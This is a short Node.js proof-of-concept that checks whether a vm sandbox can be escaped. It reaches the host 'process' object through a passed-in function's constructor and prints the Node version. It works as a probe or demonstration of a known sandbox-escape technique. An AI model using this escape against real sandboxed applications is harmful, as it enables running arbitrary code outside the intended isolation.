const vm = require('vm');
const sandbox = Object.create(null);
sandbox.safeEval = () => {};
vm.createContext(sandbox);
try {
  let res = vm.runInContext('safeEval.constructor("return process")()', sandbox);
  console.log('Vulnerable?', res.version);
} catch (e) {
  console.log('Error:', e.message);
}
